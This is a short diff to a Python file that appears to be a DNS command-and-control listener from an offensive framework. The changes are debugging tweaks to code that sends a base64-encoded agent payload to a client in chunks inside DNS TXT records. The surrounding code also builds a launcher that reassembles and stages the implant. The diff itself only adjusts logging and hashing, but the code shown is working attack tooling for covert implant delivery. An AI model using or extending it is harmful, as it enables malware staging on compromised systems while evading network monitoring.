@@ -8,6 +8,7 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import sys
 import binascii
+import random
 import base64
 import os
 import time
@@ -330,6 +331,7 @@ class Listener:
                 launcherBase += "    except socket.timeout:\n"
                 launcherBase += "        pass\n"
                 launcherBase += "ba = bytearray()\n"
+                launcherBase += "print 'length of label array: {}'.format(len(agent_base64))\n"
                 launcherBase += "for ele in agent_base64:\n"
                 launcherBase += "    ba.extend(binascii.a2b_base64(ele))\n"
                 launcherBase += "print 'length {}'.format(len(ba))\n"
@@ -629,20 +631,21 @@ def send_message(packets=None):
         
         # max length of TXT record after headers 
         n = 168
-        #m = hashlib.sha256(payload)
-        #print m.hexdigest()
+        m = hashlib.sha256(payload)
+        print m.hexdigest()
         
         print "send_payload_via_txt - sending response {} with payload len {} to tuple {}".format(hostname, len(payload), addr)
         for bytes_to_encode in [payload[i:i+n] for i in range(0, len(payload), n)]:
             ascii_to_send = binascii.b2a_base64(bytes_to_encode)
-            print "send_payload_via_txt - sending {}".format(ascii_to_send)
-            print "send_payload_via_txt - send ID {} to hostname {}".format(str(s2_reply_id),hostname)
+            #print "send_payload_via_txt - sending {}".format(ascii_to_send)
+            print "{}".format(ascii_to_send)
+            print "send_payload_via_txt - hostname {}".format(hostname)
             txt_snd = DNS(
                 id=s2_reply_id, ancount=1, qr=1,
                 qd=s2_reply_qd,
                 an=DNSRR(rrname=str(hostname), type='TXT', rdata=ascii_to_send, ttl=300))
 
-            #time.sleep(randint(0,3))
+            #time.sleep(random.randint(0,1))
 
             sock.sendto(bytes(txt_snd), s2_addr)
             txt_request, txt_addr = sock.recvfrom(512)
@@ -659,6 +662,7 @@ def send_message(packets=None):
                 counter += 1
             hostname = str(txt_dns[DNSQR].qname)
         self.stop_data_transfer(sock, s2_addr[0], s2_addr[1], txtstoptransfer, hostname, s2_reply_id)
+        print "send_payload_via_txt - number of labels to send: {}".format(len(payload) / n)
         
     # Stage 1
     def trigger_staging(self, sock, recv_hostname, ipstagetolauncher, addr, reply_id, reply_qd):
